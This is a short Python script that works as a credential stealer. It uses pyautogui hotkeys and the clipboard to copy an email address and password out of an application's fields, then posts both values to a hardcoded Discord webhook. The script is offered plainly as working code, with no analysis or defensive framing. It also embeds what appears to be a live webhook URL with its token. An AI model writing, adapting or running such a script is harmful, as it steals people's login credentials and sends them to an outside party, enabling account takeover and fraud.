import pyautogui
import time
import requests
import pyperclip

# Replace with your Discord webhook URL
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1416794325299232818/0EihutE_oAC_uGN-4Rzz-aFb0XLsi0ifONfrETrBQk4UC-5VW0df2D3TDQCBU7-B3kVp'

def send_to_discord(email, password):
    payload = {
        'content': f'Email: {email}\nPassword: {password}'
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
    if response.status_code != 204:
        print(f'Failed to send credentials to Discord: {response.status_code} {response.text}')

def grab_credentials():
    # Simulate pressing Ctrl+Shift+E to open the email field (example for a specific application)
    pyautogui.hotkey('ctrl', 'shift', 'e')
    time.sleep(1)  # Wait for the field to focus

    # Simulate copying the email
    pyautogui.hotkey('ctrl', 'c')
    time.sleep(0.5)  # Short delay to ensure clipboard update
    email = pyperclip.paste()
    time.sleep(1)

    # Simulate pressing Ctrl+Shift+P to open the password field (example for a specific application)
    pyautogui.hotkey('ctrl', 'shift', 'p')
    time.sleep(1)  # Wait for the field to focus

    # Simulate copying the password
    pyautogui.hotkey('ctrl', 'c')
    time.sleep(0.5)  # Short delay to ensure clipboard update
    password = pyperclip.paste()
    time.sleep(1)

    return email, password

if __name__ == '__main__':
    email, password = grab_credentials()
    send_to_discord(email, password)